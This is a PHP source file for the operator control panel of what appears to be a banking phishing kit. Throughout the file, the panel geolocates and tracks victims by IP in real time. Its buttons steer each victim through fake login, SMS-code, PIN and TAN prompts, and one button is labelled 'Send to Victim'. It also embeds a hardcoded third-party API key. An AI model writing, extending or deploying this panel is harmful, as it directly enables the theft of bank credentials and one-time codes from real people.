<?php
    // =============================
    include "./Assets/php/config/config.php";   
    if (!isset($_GET['ip'])) $_GET['ip'] = '127.0.0.1';
    $ip_infos = @file_get_contents("https://pro.ip-api.com/php/".  $_GET['ip'] ."?key=UO8wl6MQD2zPxmf&fields=status,message,country,countryCode,timezone,currency,isp,mobile,proxy,hosting,query");
    $ip_infos = $ip_infos ? @unserialize($ip_infos) : [];
    if(!is_array($ip_infos) || !isset($ip_infos['countryCode'])) {
        $ip_infos['countryCode'] = 'us';
        $ip_infos['country'] = 'Localhost';
        $ip_infos['isp'] = 'Local Network';
    }
    // =============================
    $cu = @file_get_contents("http://country.io/phone.json");
    $cu = $cu ? json_decode($cu, true) : [];
    // =============================
    $device_and_browser = @file_get_contents("./data/user.json");
    $info_device_and_browser = $device_and_browser ? json_decode($device_and_browser,true) : [];
    
?>
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>MJ_coder Dashboard</title>
    
    <!-- CSS FILES -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'sans-serif'],
                    },
                    colors: {
                        dark: '#0B0F19',
                        panel: 'rgba(255, 255, 255, 0.03)',
                        border: 'rgba(255, 255, 255, 0.08)',
                    }
                }
            }
        }
    </script>

    <style>
        body {
            background-color: #0B0F19;
            background-image: radial-gradient(circle at 50% 0%, rgba(99, 102, 241, 0.15) 0%, transparent 50%),
                              radial-gradient(circle at 80% 100%, rgba(236, 72, 153, 0.15) 0%, transparent 50%);
            background-attachment: fixed;
            color: #e2e8f0;
        }
        .glass-panel {
            background: rgba(30, 41, 59, 0.4);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
        }
        .pulse-ping {
            animation: pulse-ping 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }
        @keyframes pulse-ping {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: .5; transform: scale(1.05); }
        }
        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0B0F19; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #475569; }
    </style>
</head>

<body class="min-h-screen flex flex-col font-sans antialiased text-slate-300 pb-10">

    <!-- Header Section -->
    <header class="w-full max-w-6xl mx-auto px-4 pt-8 pb-6">
        <div class="glass-panel p-6 flex flex-col md:flex-row items-center justify-between gap-6 relative overflow-hidden">
            <!-- Decorative Glow -->
            <div class="absolute -top-24 -left-24 w-48 h-48 bg-indigo-500 rounded-full mix-blend-screen filter blur-[80px] opacity-30"></div>
            
            <!-- Left Stat -->
            <div class="flex items-center gap-4 z-10 w-full md:w-1/3">
                <div class="w-14 h-14 rounded-2xl bg-indigo-500/20 flex items-center justify-center border border-indigo-500/30 text-indigo-400">
                    <i class="ri-user-follow-line text-2xl"></i>
                </div>
                <div>
                    <p class="text-slate-400 text-sm font-medium uppercase tracking-wider">Total Visitors</p>
                    <h2 class="text-3xl font-bold text-white"><?php echo getVisitorsCount(); ?></h2>
                </div>
            </div>

            <!-- Logo Center -->
            <div class="flex flex-col items-center justify-center z-10 w-full md:w-1/3">
                <div class="relative group">
                    <div class="absolute -inset-1 bg-gradient-to-r from-cyan-400 to-indigo-500 rounded-full blur opacity-70 group-hover:opacity-100 transition duration-1000 group-hover:duration-200 animate-pulse"></div>
                    <img src="./Assets/imgs/photo_2025-11-03_02-35-58.jpg" alt="Logo" class="relative w-20 h-20 rounded-full object-cover border-2 border-slate-800">
                </div>
                <h1 class="mt-3 text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-indigo-400 to-cyan-400">
                    @MJ_coder Dashboard
                </h1>
            </div>

            <!-- Right Stat -->
            <div class="flex items-center gap-4 z-10 w-full md:w-1/3 justify-end text-right flex-wrap">
                <a href="visitors.php" class="flex items-center gap-2 text-sm font-semibold bg-indigo-500/20 hover:bg-indigo-500/30 border border-indigo-500/30 text-indigo-300 px-4 py-2 rounded-xl transition-all">
                    <i class="ri-group-line text-lg"></i> All Visitors
                </a>
                <div>
                    <p class="text-slate-400 text-sm font-medium uppercase tracking-wider">Current Page</p>
                    <h2 id="page" class="text-xl font-bold text-emerald-400 tracking-wide truncate max-w-[150px]">Waiting...</h2>
                </div>
                <div class="w-14 h-14 rounded-2xl bg-emerald-500/20 flex items-center justify-center border border-emerald-500/30 text-emerald-400 pulse-ping">
                    <i class="ri-radar-line text-2xl"></i>
                </div>
            </div>
        </div>
    </header>

    <!-- Target IP Details -->
    <main class="w-full max-w-6xl mx-auto px-4 flex-grow flex flex-col gap-6">
        
        <!-- Info Table -->
        <div class="glass-panel overflow-x-auto">
            <table class="w-full text-left whitespace-nowrap">
                <thead>
                    <tr class="border-b border-white/5 text-xs uppercase tracking-wider text-slate-400 bg-white/[0.02]">
                        <th class="px-6 py-4 font-medium"><i class="ri-map-pin-fill mr-1"></i> Target IP</th>
                        <th class="px-6 py-4 font-medium"><i class="ri-global-fill mr-1"></i> Location</th>
                        <th class="px-6 py-4 font-medium"><i class="ri-router-line mr-1"></i> ISP</th>
                        <th class="px-6 py-4 font-medium"><i class="ri-cpu-line mr-1"></i> Device</th>
                        <th class="px-6 py-4 font-medium"><i class="ri-base-station-fill mr-1"></i> Status</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-white/5">
                    <tr class="hover:bg-white/[0.02] transition-colors">
                        <td class="px-6 py-5 font-medium text-white flex items-center gap-2">
                            <i class="ri-focus-3-line text-rose-500 text-lg"></i>
                            <?php echo htmlspecialchars($_GET["ip"]); ?>
                        </td>
                        <td class="px-6 py-5">
                            <div class="flex items-center gap-3">
                                <img src="<?php echo "https://assets.revolut.com/assets/flags/".strtolower($ip_infos["countryCode"] ?? 'us')."@2x.webp" ?>" class="w-6 h-auto rounded-sm shadow-sm" alt="Flag">
                                <span class="font-medium text-slate-200"><?php echo htmlspecialchars($ip_infos["country"] ?? 'Unknown'); ?></span>
                            </div>
                        </td>
                        <td class="px-6 py-5 text-slate-300">
                            <?php echo htmlspecialchars($ip_infos["isp"] ?? 'Unknown'); ?>
                        </td>
                        <td class="px-6 py-5 flex items-center gap-2">
                            <?php 
                                $dev = isset($info_device_and_browser[$_GET['ip']]['device']) ? $info_device_and_browser[$_GET['ip']]['device'] : 'Unknown';
                                $browser = isset($info_device_and_browser[$_GET['ip']]['browser']) ? strtolower($info_device_and_browser[$_GET['ip']]['browser']) : 'chrome';
                            ?>
                            <span class="px-2.5 py-1 rounded-md bg-slate-800 text-xs font-semibold text-slate-300 shadow-inner border border-slate-700">
                                <?php echo htmlspecialchars($dev); ?>
                            </span>
                            <i class="ri-<?php echo htmlspecialchars($browser); ?>-fill text-xl text-slate-400"></i>
                        </td>
                        <td class="px-6 py-5">
                            <div id="visitor-list" class="flex items-center gap-2 font-medium">
                                <i class="ri-loader-4-line animate-spin text-slate-400"></i> Checking...
                            </div>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>

        <!-- Controls Grid -->
        <div class="glass-panel p-6 relative overflow-hidden">
            <h3 class="text-sm font-bold uppercase tracking-wider text-slate-400 mb-6 flex items-center gap-2">
                <i class="ri-gamepad-line text-indigo-400"></i> Command Center
            </h3>
            
            <form method="post" action="./Assets/php/config/control.php" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-4 relative z-10">
                <input type="hidden" name="step" value="control">
                <input type="hidden" name="ip" value="<?php echo htmlspecialchars($_GET['ip']); ?>">
                
                <!-- LOGIN Actions -->
                <button type="submit" name="to" value="log" class="group flex items-center justify-center gap-2 bg-gradient-to-br from-indigo-500 to-blue-600 hover:from-indigo-400 hover:to-blue-500 text-white font-semibold py-3 px-4 rounded-xl shadow-lg transition-all transform active:scale-95 border border-indigo-400/30">
                    <i class="ri-login-box-line text-lg group-hover:-translate-y-0.5 transition-transform"></i> ask LOGIN
                </button>
                <button type="submit" name="to" value="log_error" class="group flex items-center justify-center gap-2 bg-slate-800 hover:bg-slate-700 text-rose-400 font-semibold py-3 px-4 rounded-xl shadow border border-rose-500/20 transition-all transform active:scale-95">
                    <i class="ri-error-warning-line text-lg"></i> bad LOGIN
                </button>
                
                <!-- SMS Actions -->
                <button type="submit" name="to" value="sms" class="group flex items-center justify-center gap-2 bg-gradient-to-br from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 text-white font-semibold py-3 px-4 rounded-xl shadow-lg transition-all transform active:scale-95 border border-emerald-400/30">
                    <i class="ri-message-3-line text-lg group-hover:-translate-y-0.5 transition-transform"></i> ask SMS
                </button>
                <button type="submit" name="to" value="sms_error" class="group flex items-center justify-center gap-2 bg-slate-800 hover:bg-slate-700 text-rose-400 font-semibold py-3 px-4 rounded-xl shadow border border-rose-500/20 transition-all transform active:scale-95">
                    <i class="ri-error-warning-line text-lg"></i> bad SMS
                </button>

                <!-- PIN Actions -->
                <button type="submit" name="to" value="pin" class="group flex items-center justify-center gap-2 bg-gradient-to-br from-amber-500 to-orange-600 hover:from-amber-400 hover:to-orange-500 text-white font-semibold py-3 px-4 rounded-xl shadow-lg transition-all transform active:scale-95 border border-amber-400/30">
                    <i class="ri-lock-password-line text-lg group-hover:-translate-y-0.5 transition-transform"></i> ask PIN
                </button>
                <button type="submit" name="to" value="pin_error" class="group flex items-center justify-center gap-2 bg-slate-800 hover:bg-slate-700 text-rose-400 font-semibold py-3 px-4 rounded-xl shadow border border-rose-500/20 transition-all transform active:scale-95">
                    <i class="ri-error-warning-line text-lg"></i> bad PIN
                </button>

                <!-- Success / Block Actions -->
                <button type="submit" name="to" value="success" class="group flex items-center justify-center gap-2 bg-gradient-to-br from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-semibold py-3 px-4 rounded-xl shadow-lg transition-all transform active:scale-95 border border-cyan-400/30 md:col-span-2">
                    <i class="ri-checkbox-circle-fill text-lg group-hover:scale-110 transition-transform"></i> Finish / SUCCESS
                </button>
                <button type="button" onclick="blockIP('<?php echo htmlspecialchars($_GET['ip']); ?>')" class="group flex items-center justify-center gap-2 bg-gradient-to-br from-rose-600 to-red-700 hover:from-rose-500 hover:to-red-600 text-white font-semibold py-3 px-4 rounded-xl shadow-lg transition-all transform active:scale-95 border border-rose-400/30 md:col-span-2">
                    <i class="ri-prohibited-line text-lg group-hover:scale-110 transition-transform"></i> BLOCK IP
                </button>
            </form>

            <!-- Send TAN Feature (Optional) -->
            <div class="mt-4 pt-4 border-t border-white/10 relative z-10 flex flex-col md:flex-row items-center justify-between gap-4">
                <span class="text-sm text-slate-400"><i class="ri-image-line mr-1"></i> Send a custom TAN image (Optional)</span>
                <button onclick="document.getElementById('tanModal').classList.remove('hidden')" class="bg-slate-800 hover:bg-slate-700 text-slate-200 py-2 px-6 rounded-lg text-sm font-semibold border border-slate-700 transition">
                    Upload TAN Photo
                </button>
            </div>
        </div>
    </main>

    <!-- TAN Modal -->
    <div id="tanModal" class="hidden fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
        <div class="glass-panel w-full max-w-md p-6 relative">
            <button onclick="document.getElementById('tanModal').classList.add('hidden')" class="absolute top-4 right-4 text-slate-400 hover:text-white">
                <i class="ri-close-line text-xl"></i>
            </button>
            <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
                <i class="ri-image-add-line text-indigo-400"></i> Upload TAN Image
            </h3>
            <form method="post" action="./Assets/php/config/tan.php" enctype="multipart/form-data" class="flex flex-col gap-4">
                <input type="hidden" name="step" value="tan_box">
                <input type="hidden" name="ip" value="<?php echo htmlspecialchars($_GET['ip']); ?>">
                
                <div class="border-2 border-dashed border-slate-600 rounded-xl p-8 text-center hover:bg-white/[0.02] transition-colors cursor-pointer relative">
                    <input type="file" name="tan_img" id="tan_img" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer" required>
                    <i class="ri-upload-cloud-2-line text-3xl text-slate-400 mb-2"></i>
                    <p class="text-sm font-medium text-slate-300">Click or drag image here</p>
                </div>
                
                <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3 rounded-lg shadow transition">
                    Send to Victim
                </button>
            </form>
        </div>
    </div>

    <!-- Footer -->
    <footer class="text-center w-full mt-auto pt-8">
        <p class="text-slate-500 text-sm font-medium">
            &copy; 2025 <a href="#" class="text-indigo-400 hover:text-indigo-300 transition">@MJ_coder</a>. All Rights Reserved.
        </p>
    </footer>

    <!-- Scripts -->
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script>
        function fetchVisitors() {
            const targetIp = '<?php echo htmlspecialchars($_GET["ip"]) ?>';

            fetch('./status/get_visitors.php')
                .then(response => response.json())
                .then(data => {
                    const container = document.getElementById('visitor-list');
                    const pageEl = document.getElementById('page');
                    container.innerHTML = '';

                    const info = data[targetIp];
                    if (!info) {
                        container.innerHTML = `<span class="text-rose-400"><i class="ri-error-warning-fill mr-1"></i> No data</span>`;
                        pageEl.textContent = 'None';
                        return;
                    }

                    const now = Math.floor(Date.now() / 1000);
                    const isOnline = (now - info.last_update) < 15 && info.status === 'online';

                    if (isOnline) {
                        container.innerHTML = `<span class="text-emerald-400 flex items-center gap-1.5"><span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Online</span>`;
                    } else {
                        container.innerHTML = `<span class="text-slate-500 flex items-center gap-1.5"><span class="w-2 h-2 rounded-full bg-slate-500"></span> Offline</span>`;
                    }

                    pageEl.textContent = info.current_page || 'Unknown';
                    pageEl.className = isOnline ? 'text-xl font-bold text-emerald-400 tracking-wide truncate max-w-[150px]' : 'text-xl font-bold text-slate-500 tracking-wide truncate max-w-[150px]';
                })
                .catch(() => {
                    document.getElementById('visitor-list').innerHTML = `<span class="text-rose-400">Connection Error</span>`;
                });
        }

        fetchVisitors();
        setInterval(fetchVisitors, 3000); // Updated to check slightly faster for better responsiveness

        function blockIP(ip) {
            if(confirm('Are you sure you want to block this IP?')) {
                $.ajax({
                    url: './Assets/php/config/block.php',      
                    type: 'POST',
                    data: { ip: ip },
                    success: function(response) {
                        alert('IP Blocked Successfully!');
                    },
                    error: function() {
                        alert('Error blocking IP');
                    }
                });
            }
        }
    </script>
</body>
</html>